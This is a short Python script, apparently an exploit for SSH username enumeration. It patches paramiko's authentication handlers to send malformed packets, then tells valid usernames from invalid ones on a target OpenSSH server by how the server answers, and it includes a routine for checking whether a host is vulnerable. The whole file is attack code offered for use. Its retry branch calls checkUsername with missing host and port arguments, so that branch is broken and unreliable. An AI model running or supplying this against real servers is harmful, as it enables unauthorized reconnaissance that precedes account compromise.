import paramiko
import socket
import string
from random import randint as rand
from random import choice as choice
old_parse_service_accept = paramiko.auth_handler.AuthHandler._client_handler_table[paramiko.common.MSG_SERVICE_ACCEPT]
random_username_list = []
class BadUsername(Exception):
    def __init__(self):
        pass
def add_boolean(*args, **kwargs):
    pass
for i in range(3):
    user = "".join(choice(string.ascii_lowercase) for x in range(rand(15, 20)))
    random_username_list.append(user)
def malform_packet(*args, **kwargs):
    old_add_boolean = paramiko.message.Message.add_boolean
    paramiko.message.Message.add_boolean = add_boolean
    result  = old_parse_service_accept(*args, **kwargs)
    paramiko.message.Message.add_boolean = old_add_boolean
    return result
    
def call_error(*args, **kwargs):
    raise BadUsername()

paramiko.auth_handler.AuthHandler._client_handler_table[paramiko.common.MSG_SERVICE_ACCEPT] = malform_packet
paramiko.auth_handler.AuthHandler._client_handler_table[paramiko.common.MSG_USERAUTH_FAILURE] = call_error

def checkUsername(username, host, port, tried=0):
    sock = socket.socket()
    sock.connect((host,port))
    transport = paramiko.transport.Transport(sock)
    try:
        transport.start_client()
    except paramiko.ssh_exception.SSHException:
        transport.close()
        if tried < 4:
            tried += 1
            return checkUsername(username, tried)
        else:
            print('[-] Failed to negotiate SSH transport')
    try:
        transport.auth_publickey(username, paramiko.RSAKey.generate(1024))
    except BadUsername:
            return (username, False)
    except paramiko.ssh_exception.AuthenticationException:
            return (username, True)
    raise Exception("There was an error. Is this the correct version of OpenSSH?")

def checkVulnerable(host, port):
    vulnerable = True
    for user in random_username_list:
        result = checkUsername(user, host, port)
        if result[1]:
            vulnerable = False
    return vulnerable
